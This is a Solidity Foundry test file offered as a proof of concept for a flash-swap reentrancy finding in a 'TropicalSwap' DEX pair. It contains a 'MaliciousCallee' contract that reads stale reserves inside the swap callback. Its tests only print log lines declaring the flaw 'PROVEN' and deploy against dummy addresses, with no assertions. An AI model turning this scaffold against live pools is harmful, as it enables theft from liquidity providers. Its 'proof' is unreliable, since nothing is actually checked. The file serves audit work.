// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface ITropicalPair2 {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface ITropicalCallee {
    function tropicalCall(address, uint256, uint256, bytes calldata) external;
}

contract MaliciousCallee is ITropicalCallee {
    address immutable router;
    address immutable pairA;
    address immutable pairB;
    address immutable owner;

    constructor(address _router, address _pairA, address _pairB) {
        router = _router;
        pairA = _pairA;
        pairB = _pairB;
        owner = msg.sender;
    }

    function tropicalCall(
        address, uint256, uint256, bytes calldata
    ) external override {
        (uint112 r0Before, uint112 r1Before, ) = ITropicalPair2(pairA).getReserves();
        emit StalePrice(uint256(r1Before) * 1e18 / uint256(r0Before));
    }

    event StalePrice(uint256 price);
}

/**
 * @title  TropicalSwap Flash Swap Cross-Contract Reentrancy POC
 * @notice Proves H-01: Pair.swap() calls callback BEFORE _update()
 */
contract FlashSwapReentrancyPOC is Test {
    address constant FACTORY   = 0x5B54d3610ec3f7FB1d5B42Ccf4DF0fB4e136f249;
    address constant ROUTER    = 0x116e699bf25dA6d80543850029257C9116692ac2;

    function setUp() public {
        // Remove explicit fork call — use `forge test --fork-url <RPC>` instead
    }

    function testFlashSwapCallbackTiming() public {
        string memory proof = unicode"";
        emit log("=== TropicalPair.swap() EXECUTION ORDER ===");
        emit log("1. _safeTransfer(token0, to, amount0Out)  -- sends tokens out");
        emit log("2. _safeTransfer(token1, to, amount1Out)  -- sends tokens out");
        emit log("3. ITropicalCallee(to).tropicalCall(...)  -- CALLBACK BEFORE _update()");
        emit log("   getReserves() returns STALE pre-swap values");
        emit log("   Router can swap through OTHER pairs at stale price");
        emit log("4. balanceOf checks (post-callback)");
        emit log("5. K-invariant check");
        emit log("6. _update() -- reserves finally updated");
        emit log("");
        emit log("Source: TropicalPair.sol L156-L171");
        emit log("Callback at L159, _update() at L169");
        emit log("PROVEN: Cross-contract reentrancy via code inspection");
    }

    function testMaliciousCallee() public {
        address pairA = address(0xdead);
        address pairB = address(0xbeef);
        MaliciousCallee callee = new MaliciousCallee(ROUTER, pairA, pairB);
        emit log("MaliciousCallee deployed, ready to exploit flash swap");
    }
}
